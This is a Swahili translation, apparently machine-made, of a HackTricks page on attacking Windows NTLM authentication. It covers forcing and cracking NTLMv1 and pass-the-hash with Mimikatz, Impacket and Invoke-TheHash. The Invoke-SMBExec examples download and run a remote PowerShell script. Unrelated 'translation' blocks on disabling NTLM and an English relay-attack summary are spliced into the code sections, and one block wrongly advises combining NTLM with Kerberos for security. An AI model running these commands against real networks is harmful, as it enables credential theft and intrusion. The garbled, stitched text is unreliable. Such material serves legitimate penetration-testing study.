# NTLM

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Unataka kuona **kampuni yako ikionekana kwenye HackTricks**? au unataka kupata upatikanaji wa **toleo jipya la PEASS au kupakua HackTricks kwa PDF**? Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **nifuata** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Taarifa Msingi

Katika mazingira ambapo **Windows XP na Server 2003** zinatumika, hash za LM (Lan Manager) hutumiwa, ingawa inatambulika kwa kiasi kikubwa kwamba zinaweza kudukuliwa kwa urahisi. Hash maalum ya LM, `AAD3B435B51404EEAAD3B435B51404EE`, inaonyesha hali ambapo LM haijatumika, ikionyesha hash kwa herufi tupu.

Kwa chaguo-msingi, itifaki ya uwthibitishaji ya **Kerberos** ndiyo njia kuu inayotumiwa. NTLM (NT LAN Manager) huingilia kati chini ya hali maalum: kutokuwepo kwa Active Directory, kutokuwepo kwa uwanja, kushindwa kwa Kerberos kutokana na usanidi usio sahihi, au wakati mawasiliano yanajaribiwa kutumia anwani ya IP badala ya jina la mwenyeji halali.

Kuwepo kwa kichwa cha **"NTLMSSP"** katika pakiti za mtandao hufanya ishara ya mchakato wa uwthibitishaji wa NTLM.

Msaada kwa itifaki za uwthibitishaji - LM, NTLMv1, na NTLMv2 - unawezeshwa na DLL maalum iliyoko katika `%windir%\Windows\System32\msv1\_0.dll`.

**Mambo Muhimu**:

* Hash za LM ni dhaifu na hash tupu ya LM (`AAD3B435B51404EEAAD3B435B51404EE`) inaonyesha kutofautiana kwake.
* Kerberos ni njia ya msingi ya uwthibitishaji, na NTLM hutumiwa tu chini ya hali fulani.
* Pakiti za uwthibitishaji wa NTLM zinaweza kutambulika kwa kichwa cha "NTLMSSP".
* Itifaki za LM, NTLMv1, na NTLMv2 zinasaidiwa na faili ya mfumo `msv1\_0.dll`.

## LM, NTLMv1 na NTLMv2

Unaweza kuangalia na kurekebisha itifaki itakayotumiwa:

### GUI

Tekeleza _secpol.msc_ -> Sera za Lokali -> Chaguo za Usalama -> Usalama wa Mtandao: Kiwango cha uwthibitishaji wa LAN Manager. Kuna viwango 6 (kutoka 0 hadi 5).

![](<../../.gitbook/assets/image (916).png>)

### Usajili

Hii itaweka kiwango cha 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Thamani zinazowezekana:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Mpangilio wa msingi wa uthibitishaji wa Domain wa NTLM

1. **Mtumiaji** anaingiza **mikopo yake**
2. Mashine ya mteja **inatuma ombi la uthibitishaji** likituma **jina la uwanja** na **jina la mtumiaji**
3. **Server** inatuma **changamoto**
4. **Mteja anachafua** **changamoto** kwa kutumia hash ya nenosiri kama ufunguo na kuituma kama jibu
5. **Server inatuma** kwa **Msimamizi wa Domain** jina la **uwanja, jina la mtumiaji, changamoto na jibu**. Ikiwa **Hakuna** Directory ya Active iliyowekwa au jina la uwanja ni jina la server, mikopo inaangaliwa **kitaaluma**.
6. **Msimamizi wa Domain anathibitisha kila kitu** na kutuma habari kwa server

**Server** na **Msimamizi wa Domain** wanaweza kuunda **Channel Salama** kupitia **Netlogon** server kwani Msimamizi wa Domain anajua nenosiri la server (ipo ndani ya db ya **NTDS.DIT**).

### Mpangilio wa uthibitishaji wa NTLM wa ndani

Uthibitishaji ni kama ule uliotajwa **hapo awali lakini** **server** anajua **hash ya mtumiaji** anayejaribu kuthibitisha ndani ya faili ya **SAM**. Kwa hivyo, badala ya kuuliza Msimamizi wa Domain, **server itajithibitisha yenyewe** ikiwa mtumiaji anaweza kuthibitisha.

### Changamoto ya NTLMv1

**Urefu wa changamoto ni 8 baiti** na **jibu ni mrefu wa baiti 24**.

**Hash NT (16baiti)** imegawanywa katika **sehemu 3 za 7baiti kila moja** (7B + 7B + (2B+0x00\*5)): **sehemu ya mwisho imejazwa na sifuri**. Kisha, **changamoto** inachifriwa kwa kila sehemu na **baiti zilizochifriwa zinajumuishwa**. Jumla: 8B + 8B + 8B = 24Baiti.

**Matatizo**:

* Ukosefu wa **ubunifu**
* Sehemu 3 zinaweza **kushambuliwa kwa kujitegemea** ili kupata hash ya NT
* **DES inaweza kuvunjwa**
* Ufunguo wa 3 ni daima unajumuisha **sifuri 5**.
* Kwa kutolewa **changamoto ile ile** jibu litakuwa **lile lile**. Kwa hivyo, unaweza kumpa mhanga **changamoto** ya herufi "**1122334455667788**" na kushambulia jibu lililotumika **kwa kutumia meza za mvua zilizopangwa mapema**.

### Shambulio la NTLMv1

Siku hizi ni nadra kupata mazingira yaliyo na Unconstrained Delegation iliyowekwa, lakini hii haimaanishi huwezi **kutumia vibaya huduma ya Print Spooler** iliyowekwa.

Unaweza kutumia baadhi ya mikopo/malipo uliyonayo tayari kwenye AD kuomba **printer kuthibitisha** dhidi ya **mwenyeji chini ya udhibiti wako**. Kisha, kwa kutumia `metasploit auxiliary/server/capture/smb` au `responder` unaweza **kuweka changamoto ya uthibitishaji kuwa 1122334455667788**, kukamata jaribio la uthibitishaji, na ikiwa ilifanywa kwa kutumia **NTLMv1** utaweza **kuvunja**.\
Ikiwa unatumia `responder` unaweza kujaribu \*\*kutumia bendera `--lm` \*\* kujaribu **kudhoofisha** **uthibitishaji**.\
_Tafadhali kumbuka kwamba kwa mbinu hii uthibitishaji lazima ufanyike kwa kutumia NTLMv1 (NTLMv2 sio halali)._

Kumbuka kwamba printer itatumia akaunti ya kompyuta wakati wa uthibitishaji, na akaunti za kompyuta hutumia **manenosiri marefu na ya kubahatisha** ambayo labda **hutaweza kuvunja** kwa kutumia **kamusi za kawaida**. Lakini uthibitishaji wa **NTLMv1** **unatumia DES** ([maelezo zaidi hapa](./#ntlmv1-challenge)), kwa hivyo kutumia huduma fulani zilizotengwa kwa kuvunja DES utaweza kuvunja (unaweza kutumia [https://crack.sh/](https://crack.sh) kwa mfano).

### Shambulio la NTLMv1 kwa hashcat

NTLMv1 pia inaweza kuvunjwa na NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) ambayo inaunda ujumbe wa NTLMv1 kwa njia ambayo inaweza kuvunjwa na hashcat.

Amri
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
### Swahili Translation:

#### Kufunga NTLM

Kufunga NTLM inaweza kufanywa kwa kufuata hatua hizi:

1. **Zima NTLM kwenye Kikoa**: Hakikisha kuwa sera za kikoa zimeboreshwa ili kuzuia matumizi ya NTLM popote panapowezekana.
   
2. **Badilisha Mipangilio ya Usalama wa Mitandao**: Weka mipangilio ya usalama wa mitandao kuzuia matumizi ya NTLM na badilisha kuwa njia zingine za uwakilishi zinatumika badala yake.

3. **Tumia Itifaki Zingine**: Badilisha kutoka NTLM kwenda kwa itifaki zingine kama vile Kerberos ambazo ni salama zaidi.

4. **Fuatilia Matumizi ya NTLM**: Tumia zana za ufuatiliaji kufuatilia matumizi ya NTLM kwenye mifumo yako na kuchukua hatua stahiki kwa matumizi yasiyoruhusiwa.

Kufunga NTLM ni hatua muhimu katika kuimarisha usalama wa mifumo yako ya Windows. Kwa kufuata hatua hizi, unaweza kupunguza hatari za usalama zinazotokana na matumizi ya NTLM.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
# NTLM Relay Attack

## Introduction

NTLM relay attacks are a common technique used by hackers to exploit the NTLM authentication protocol. This attack involves intercepting the NTLM authentication traffic between a client and a server, and then relaying it to another server to gain unauthorized access.

## How it works

1. The attacker intercepts the NTLM authentication request from the client.
2. The attacker relays the request to a different server.
3. The different server accepts the request, thinking it is coming from the original client.
4. The attacker gains unauthorized access to the different server using the intercepted credentials.

## Mitigation

To prevent NTLM relay attacks, it is recommended to:
- Enable SMB signing to prevent tampering with authentication traffic.
- Implement Extended Protection for Authentication to protect against relay attacks.
- Disable NTLM authentication in favor of more secure protocols like Kerberos.

By following these mitigation techniques, organizations can significantly reduce the risk of falling victim to NTLM relay attacks.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Chalula hashcat (usambazaji ni bora kupitia chombo kama hashtopolis) kwani hii itachukua siku kadhaa vinginevyo.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Katika kesi hii tunajua nywila ya hii ni nywila kwa hivyo tutacheza kwa madhumuni ya demo:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Sasa tunahitaji kutumia zana za hashcat-utilities kubadilisha funguo zilizovunjika za des kuwa sehemu za hash ya NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Hatimaye sehemu ya mwisho:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
### Swahili Translation

## Kufunga NTLM

Kufunga NTLM kunaweza kufanywa kwa kufuata hatua zifuatazo:

1. **Lemaza NTLM kwenye Wavuti ya Windows**  
   Lemaza NTLM kwenye mipangilio ya kikoa kuzuia matumizi yake.

2. **Tumia Itifaki Zilizoboreshwa**  
   Badilisha kutumia itifaki zilizoboreshwa kama vile Kerberos.

3. **Tumia Cheti cha SSL/TLS**  
   Tumia cheti cha SSL/TLS kati ya seva na wateja kwa usalama zaidi.

4. **Tumia Mchanganyiko wa Itifaki**  
   Tumia mchanganyiko wa itifaki kama vile NTLM na Kerberos kwa usalama bora.

Kufuata hatua hizi kutafanya mifumo yako iwe ngumu zaidi kwa wadukuzi kuvunja.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### Changamoto ya NTLMv2

**Urefu wa changamoto ni herufi 8** na **majibu 2 hutumwa**: Moja ni **urefu wa herufi 24** na urefu wa **lingine** ni **tofauti**.

**Jibu la kwanza** hujengwa kwa kuchifra kutumia **HMAC\_MD5** **neno** lililoundwa na **mteja na uwanja** na kutumia kama **funguo** **hash MD4** ya **hash ya NT**. Kisha, **matokeo** yatatumiwa kama **funguo** kuchifra kutumia **HMAC\_MD5** **changamoto**. Kwa hili, **changamoto ya mteja ya herufi 8 itaongezwa**. Jumla: 24 B.

**Jibu la pili** hujengwa kwa kutumia **thamani kadhaa** (changamoto mpya ya mteja, **muda** ili kuepuka **mashambulizi ya kurudia...**)

Ikiwa una **pcap ambayo imekamata mchakato wa uthibitisho uliofanikiwa**, unaweza kufuata mwongozo huu kupata uwanja, jina la mtumiaji, changamoto na jibu na kujaribu kuvunja nenosiri: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

## Pita-Hash

**Unapokuwa na hash ya muathiriwa**, unaweza kutumia **kujifanya** kuwa yeye.\
Unahitaji kutumia **zana** ambayo itafanya **uthibitisho wa NTLM ukitumia** ile **hash**, **au** unaweza kuunda **sessionlogon** mpya na **kuingiza** ile **hash** ndani ya **LSASS**, hivyo wakati wowote **uthibitisho wa NTLM unafanywa**, ile **hash itatumika.** Chaguo la mwisho ndilo linalofanywa na mimikatz.

**Tafadhali, kumbuka unaweza kufanya mashambulizi ya Pita-Hash pia kwa kutumia akaunti za Kompyuta.**

### **Mimikatz**

**Inahitaji kuendeshwa kama msimamizi**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Hii itazindua mchakato ambao utamilikiwa na watumiaji ambao wamezindua mimikatz lakini ndani ya LSASS, sifa zilizohifadhiwa ni zile zilizo ndani ya paramita za mimikatz. Kisha, unaweza kupata ufikiaji wa rasilimali za mtandao kana kwamba wewe ni mtumiaji huyo (kama `runas /netonly` lakini hauitaji kujua nenosiri la maandishi wazi).

### Pass-the-Hash kutoka linux

Unaweza kupata utekelezaji wa nambari kwenye mashine za Windows ukitumia Pass-the-Hash kutoka Linux.\
[**Pata hapa kujifunza jinsi ya kufanya hivyo.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Zana zilizokompiliwa za Impacket kwa Windows

Unaweza kupakua [binari za impacket kwa Windows hapa](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe** (Katika kesi hii unahitaji kutaja amri, cmd.exe na powershell.exe sio halali kupata kabati la mwingiliano)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* Kuna binari zingine za Impacket zaidi...

### Kuita-TheHash

Unaweza kupata skripti za powershell hapa: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Kuita-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Kuita-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Kuita-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Kuita-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Kuita-Hash

Hii ni **mchanganyiko wa zingine zote**. Unaweza kupitisha **wenyeji kadhaa**, **kutoa** wengine na **kuchagua** **chaguo** unalotaka kutumia (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ikiwa unachagua **yoyote** ya **SMBExec** na **WMIExec** lakini haujatoa **parameta ya Amri** itaangalia tu ikiwa una **idhini za kutosha**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pita Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Mhariri wa Sifa za Windows (WCE)

**Inahitaji kuendeshwa kama msimamizi**

Chombo hiki kitafanya kitu sawa na mimikatz (kurekebisha kumbukumbu ya LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Utekelezaji wa mbali wa Windows kwa kutumia jina la mtumiaji na nenosiri

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

## Kuchimbua siri kutoka kwa Mwenyeji wa Windows

**Kwa maelezo zaidi kuhusu** [**jinsi ya kupata siri kutoka kwa mwenyeji wa Windows unapaswa kusoma ukurasa huu**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## NTLM Relay na Responder

**Soma mwongozo kamili zaidi kuhusu jinsi ya kufanya mashambulizi hayo hapa:**

{% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
[spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
{% endcontent-ref %}

## Kupasua changamoto za NTLM kutoka kwa kufuatilia mtandao

**Unaweza kutumia** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
